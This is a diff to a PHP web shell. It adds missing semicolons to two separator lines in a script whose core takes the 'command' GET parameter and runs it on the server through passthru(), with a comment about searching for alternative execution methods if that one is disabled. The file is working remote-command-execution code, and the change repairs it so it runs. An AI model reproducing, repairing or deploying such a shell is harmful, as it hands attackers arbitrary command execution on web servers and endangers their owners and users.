@@ -10,7 +10,7 @@ header('Content-Type: text/plain; charset=UTF-8');
 
 // your parameter/key here
 $parameter = 'command';
-echo "\n\n\n------------------------------------------Separator------------------------------------------\n\n\n"
+echo "\n\n\n------------------------------------------Separator------------------------------------------\n\n\n";
 if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'get' && isset($_GET[$parameter]) && ($_GET[$parameter] = trim($_GET[$parameter])) && strlen($_GET[$parameter]) > 0) {
     // if passthru() is disabled, search for an alternative method
     if (@passthru("($_GET[$parameter]) 2>&1") === false) {
@@ -20,5 +20,5 @@ if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) 
     // garbage collector requires PHP v5.3.0 or greater
     // @gc_collect_cycles();
 }
-echo "\n\n\n------------------------------------------Separator------------------------------------------\n\n\n"
+echo "\n\n\n------------------------------------------Separator------------------------------------------\n\n\n";
 ?>
